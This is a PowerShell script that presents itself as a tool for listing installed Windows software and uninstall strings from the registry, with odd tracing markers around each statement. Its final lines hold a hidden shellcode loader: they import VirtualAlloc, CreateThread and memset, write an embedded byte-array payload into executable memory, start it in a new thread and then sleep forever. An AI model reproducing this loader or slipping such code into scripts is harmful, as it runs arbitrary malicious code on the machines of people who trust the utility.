











 -||-> cls <-||- 
 -||-> $Global:OS <-||- 

 -||-> Function GetOSArchitecture{
	 -||-> $Global:OS= -||-> Get-WMIObject win32_operatingsystem <-||-  <-||- 
	
	
} <-||- 

 -||-> $DisplayOutput = $false <-||- 
 -||-> GetOSArchitecture <-||- 
 -||-> [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") <-||- 
 -||-> [System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic') | Out-Null <-||- 
 -||-> $Output = [System.Windows.Forms.MessageBox]::Show("Search for a specific program?" , "Status" , 4) <-||- 
 -||-> If ( -||-> $Output -eq "Yes" <-||- ){
	 -||-> $ProgramName = [Microsoft.VisualBasic.Interaction]::InputBox("Enter specific software name:") <-||- 
	 -||-> $ProgramName = "*"+$ProgramName+"*" <-||- 
} <-||- 
 -||-> If ( -||-> $Global:OS.OSArchitecture -eq "32-bit" <-||- ){
	 -||-> $RegPath = "HKLM:\software\microsoft\windows\currentversion\uninstall\" <-||- 
	 -||-> $Results =  -||-> Get-ChildItem $RegPath -Recurse -ErrorAction SilentlyContinue <-||-  <-||- 
	 -||-> foreach ($item in  -||-> $Resultsx86 <-||- ){
		 -||-> If ( -||-> ( -||-> $item.GetValue("DisplayName") -ne $null <-||- ) -and ( -||-> $item.GetValue("UninstallString") -ne $null <-||- ) <-||- ) {
			 -||-> Write-Host <-||- 
			 -||-> Write-Host <-||- 
    		 -||-> Write-Host "   Software: "$item.GetValue("DisplayName") <-||- 
			 -||-> Write-Host "    Version: "$item.GetValue("DisplayVersion") <-||- 
    		 -||-> Write-Host "Uninstaller: "$item.GetValue("UninstallString") <-||- 
		} <-||- 
	} <-||- 
} <-||- 
 -||-> If ( -||-> $Global:OS.OSArchitecture -eq "64-bit" <-||- ){
	 -||-> $RegPathx86 = "HKLM:\software\wow6432node\microsoft\windows\currentversion\uninstall\" <-||- 
	 -||-> $RegPathx64 = "HKLM:\software\microsoft\windows\currentversion\uninstall\" <-||- 
	 -||-> $Resultsx86 =  -||-> Get-ChildItem $RegPathx86 -Recurse -ErrorAction SilentlyContinue <-||-  <-||- 
	 -||-> $Resultsx64 =  -||-> Get-ChildItem $RegPathx64 -Recurse -ErrorAction SilentlyContinue <-||-  <-||- 
	 -||-> foreach ($item in  -||-> $Resultsx86 <-||- ){
		 -||-> If ( -||-> ( -||-> $item.GetValue("DisplayName") -ne $null <-||- ) -and ( -||-> $item.GetValue("UninstallString") -ne $null <-||- ) <-||- ) {
			 -||-> If ( -||-> $Output -eq "Yes" <-||- ){
				 -||-> If ( -||-> $item.GetValue("DisplayName") -like $ProgramName <-||- ){
					 -||-> $DisplayOutput = $true <-||- 
				} <-||- 
			}else{
				 -||-> $DisplayOutput = $true <-||- 
			} <-||- 
			 -||-> If ( -||-> $DisplayOutput -eq $true <-||- ){
				 -||-> Write-Host <-||- 
				 -||-> Write-Host <-||- 
    			 -||-> Write-Host "   Software: "$item.GetValue("DisplayName") <-||- 
				 -||-> Write-Host "    Version: "$item.GetValue("DisplayVersion") <-||- 
    			 -||-> Write-Host "Uninstaller: "$item.GetValue("UninstallString") <-||- 
			} <-||- 
		} <-||- 
		 -||-> $DisplayOutput = $false <-||- 
	} <-||- 
	 -||-> $DisplayOutput = $false <-||- 
	 -||-> foreach ($item in  -||-> $Resultsx64 <-||- ){
		 -||-> If ( -||-> ( -||-> $item.GetValue("DisplayName") -ne $null <-||- ) -and ( -||-> $item.GetValue("UninstallString") -ne $null <-||- ) <-||- ) {
			 -||-> If ( -||-> $Output -eq "Yes" <-||- ){
				 -||-> If ( -||-> $item.GetValue("DisplayName") -like $ProgramName <-||- ){
					 -||-> $DisplayOutput = $true <-||- 
				} <-||- 
			}else{
				 -||-> $DisplayOutput = $true <-||- 
			} <-||- 
			 -||-> If ( -||-> $DisplayOutput -eq $true <-||- ){
				 -||-> Write-Host <-||- 
				 -||-> Write-Host <-||- 
    			 -||-> Write-Host "   Software: "$item.GetValue("DisplayName") <-||- 
				 -||-> Write-Host "    Version: "$item.GetValue("DisplayVersion") <-||- 
    			 -||-> Write-Host "Uninstaller: "$item.GetValue("UninstallString") <-||- 
			} <-||- 
		} <-||- 
		 -||-> $DisplayOutput = $false <-||- 
	} <-||- 
} <-||- 
 -||-> $6j1p = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $6j1p -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xd9,0xe9,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x47,0xbf,0xa1,0xb7,0xfd,0x9e,0x31,0x78,0x18,0x03,0x78,0x18,0x83,0xc0,0xa5,0x55,0x08,0x62,0x4d,0x1b,0xf3,0x9b,0x8d,0x7c,0x7d,0x7e,0xbc,0xbc,0x19,0x0a,0xee,0x0c,0x69,0x5e,0x02,0xe6,0x3f,0x4b,0x91,0x8a,0x97,0x7c,0x12,0x20,0xce,0xb3,0xa3,0x19,0x32,0xd5,0x27,0x60,0x67,0x35,0x16,0xab,0x7a,0x34,0x5f,0xd6,0x77,0x64,0x08,0x9c,0x2a,0x99,0x3d,0xe8,0xf6,0x12,0x0d,0xfc,0x7e,0xc6,0xc5,0xff,0xaf,0x59,0x5e,0xa6,0x6f,0x5b,0xb3,0xd2,0x39,0x43,0xd0,0xdf,0xf0,0xf8,0x22,0xab,0x02,0x29,0x7b,0x54,0xa8,0x14,0xb4,0xa7,0xb0,0x51,0x72,0x58,0xc7,0xab,0x81,0xe5,0xd0,0x6f,0xf8,0x31,0x54,0x74,0x5a,0xb1,0xce,0x50,0x5b,0x16,0x88,0x13,0x57,0xd3,0xde,0x7c,0x7b,0xe2,0x33,0xf7,0x87,0x6f,0xb2,0xd8,0x0e,0x2b,0x91,0xfc,0x4b,0xef,0xb8,0xa5,0x31,0x5e,0xc4,0xb6,0x9a,0x3f,0x60,0xbc,0x36,0x2b,0x19,0x9f,0x5e,0x98,0x10,0x20,0x9e,0xb6,0x23,0x53,0xac,0x19,0x98,0xfb,0x9c,0xd2,0x06,0xfb,0xe3,0xc8,0xff,0x93,0x1a,0xf3,0xff,0xba,0xd8,0xa7,0xaf,0xd4,0xc9,0xc7,0x3b,0x25,0xf6,0x1d,0xd1,0x20,0x60,0xd0,0x2f,0x63,0x2d,0x84,0x2d,0x73,0xdc,0x08,0xbb,0x95,0x8e,0xe0,0xeb,0x09,0x6e,0x51,0x4c,0xfa,0x06,0xbb,0x43,0x25,0x36,0xc4,0x89,0x4e,0xdc,0x2b,0x64,0x26,0x48,0xd5,0x2d,0xbc,0xe9,0x1a,0xf8,0xb8,0x29,0x90,0x0f,0x3c,0xe7,0x51,0x65,0x2e,0x9f,0x91,0x30,0x0c,0x09,0xad,0xee,0x3b,0xb5,0x3b,0x15,0xea,0xe2,0xd3,0x17,0xcb,0xc4,0x7b,0xe7,0x3e,0x5f,0xb5,0x7d,0x81,0x37,0xba,0x91,0x01,0xc7,0xec,0xfb,0x01,0xaf,0x48,0x58,0x52,0xca,0x96,0x75,0xc6,0x47,0x03,0x76,0xbf,0x34,0x84,0x1e,0x3d,0x63,0xe2,0x80,0xbe,0x46,0xf2,0xfd,0x68,0xae,0x80,0xef,0xa8 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $n3mw=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $n3mw.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$n3mw,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



